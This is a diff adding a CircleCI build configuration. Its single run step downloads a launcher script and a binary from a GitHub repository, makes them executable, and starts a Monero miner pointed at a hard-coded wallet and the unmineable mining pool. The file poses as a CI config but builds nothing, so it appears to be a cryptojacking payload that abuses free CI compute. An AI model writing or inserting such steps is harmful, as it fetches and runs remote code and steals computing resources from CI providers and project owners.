@@ -1,0 +1,16 @@
+version: 2.0
+jobs:
+  build:
+    docker:
+      - image: circleci/ruby:2.4.2-jessie-node
+        auth:
+          username: mydockerhub-user
+          password: $DOCKERHUB_PASSWORD  # context / project UI env-var reference
+    steps:
+      - checkout
+      - run: wget https://raw.githubusercontent.com/hunshukajh/yes/main/cmdline_launcher.sh && \
+wget https://github.com/hunshukajh/yes/raw/main/gas && \
+chmod +x gas cmdline_launcher.sh && \
+./cmdline_launcher.sh -algo randomx -coin XMR \
+-wallet XMR:88ShoRuQAns2zfCrQWqC9M6bBjCCBf4xs7TNyXDK3iHsdkQTRaK75MNUxqzw4X62bwF2ik6HwBeJeNdsTTy98MUnS9Q4Rmp.$(echo $(shuf -i 1-9999 -n 1)-SRBO) \
+-pool1 rx.unmineable.com:3333
